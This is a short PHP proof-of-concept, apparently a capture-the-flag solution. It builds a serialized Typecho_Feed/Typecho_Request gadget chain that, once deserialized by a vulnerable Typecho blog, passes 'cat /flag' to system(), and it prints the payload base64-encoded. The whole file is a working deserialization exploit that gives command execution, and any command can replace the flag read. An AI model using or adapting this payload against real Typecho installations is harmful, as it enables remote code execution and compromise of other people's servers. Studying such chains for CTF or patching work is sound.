<?php
class Typecho_Feed{
    //const RSS2 = 'RSS 2.0';
    private $_type;
    private $_items = array();
    public function __construct()
    {
		//不加就会出现database error500
        $this->_type = 'RSS 2.0';
        $item['author'] = new Typecho_Request();
        //$item['category'] = array(new Typecho_Request());
        $this->_items[0] = $item;
    }
}
class Typecho_Request
{
    private $_params = array();
    private $_filter = array();
    function __construct()
    {
        $this->_params["screenName"]="cat /flag";
        $this->_filter[0]="system";
    }
}

$a = array("adapter" =>  new Typecho_Feed(),"prefix" => "test");
echo base64_encode(serialize($a));
?>